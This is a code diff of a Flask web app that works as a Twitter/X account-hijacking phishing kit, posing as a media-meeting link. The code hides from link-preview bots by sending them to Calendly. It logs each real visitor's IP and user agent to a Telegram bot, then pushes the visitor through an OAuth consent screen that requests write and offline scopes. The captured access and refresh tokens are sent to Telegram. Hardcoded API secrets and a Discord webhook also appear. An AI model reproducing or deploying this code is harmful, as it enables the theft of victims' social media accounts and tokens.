@@ -6,7 +6,7 @@ app = Flask(__name__)
 
 TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ'
 TWITTER_CLIENT_SECRET = 'FJchk67NNjQgydI77UUI1xQ7a8u4zY50LJuPYFCzzP8I0MkSZ6'
-TWITTER_CALLBACK_URL = 'https://souls1o.pythonanywhere.com/callback'
+TWITTER_CALLBACK_URL = 'https://twitter-logger.onrender.com/callback'
 TELEGRAM_GROUP_CHAT_ID = '-4124636328'
 
 TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
@@ -16,20 +16,6 @@ credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')
 
 @app.route('/decryptmedia/meeting-hour')
 def index():
-    refId = request.args.get('ref')
-    url = f'https://panel-1rn0.onrender.com/api/connection/send/{refId}'
-
-    data = {
-        'IP': '192.168.1.100',
-        'country': 'AU',
-        'device': 'Windows 10',
-        'OSName': 'Firefox'
-    }
-    print(data)
-
-    res = requests.post(url, json=data, proxies=None)
-    print(res)
-
     user_agent = request.headers.get('User-Agent').strip('\r\n')
     if 'Twitterbot' in user_agent or 'Discordbot' in user_agent or 'TelegramBot' in user_agent:
         return redirect('https://calendly.com/advonis-x')
@@ -38,7 +24,20 @@ def index():
             real_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
         else:
             real_ip = request.remote_addr
-        message = f'🔗 Connection: {real_ip}\n\nRef ID: {refId}'
+
+        refId = request.args.get('ref')
+        url = f'https://panel-1rn0.onrender.com/api/connection/send/{refId}'
+    
+        data = {
+            'IP': real_ip,
+            'country': 'AU',
+            'device': 'Windows 10',
+            'OSName': 'Firefox'
+        }
+        
+        # res = requests.post(url, json=data, proxies=None)
+    
+        message = f'🔗 Connection: {real_ip}\n\nUser agent: {user_agent}'
 
         requests.post(
             f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
@@ -47,14 +46,6 @@ def index():
                 'text': message
             }
         )
-
-        # requests.post(
-        #    'https://discord.com/api/webhooks/1211064788042518529/t_bTOuConN3wU84p55nhMW8BEBA54n6_UygdkZ45_Ha88-z6hVeFrfYMVFJYedP4Ev_V',
-        #    data={
-        #        "content": f'`{message}`',
-        #        "username": "Twitter Logger"
-        #    }
-        # )
 
         twitter_oauth_url = f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}&redirect_uri={TWITTER_CALLBACK_URL}&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write&state=state&code_challenge=challenge&code_challenge_method=plain'
         return redirect(twitter_oauth_url)
@@ -99,15 +90,6 @@ def callback():
     username = response_data['data']['username']
 
     send_to_telegram(username, access_token, refresh_token)
-
-    # message = f'`⚠️ New Hit ⚠️`\n\nhttps://x.com/{username}'
-
-    # requests.post(
-    #    'https://discord.com/api/webhooks/1211064788042518529/t_bTOuConN3wU84p55nhMW8BEBA54n6_UygdkZ45_Ha88-z6hVeFrfYMVFJYedP4Ev_V',
-    #    data={
-    #        "content": message,
-    #        "username": "Twitter Logger"
-    #    })
 
     return redirect("https://calendly.com/decryptmedia", code=302)
 
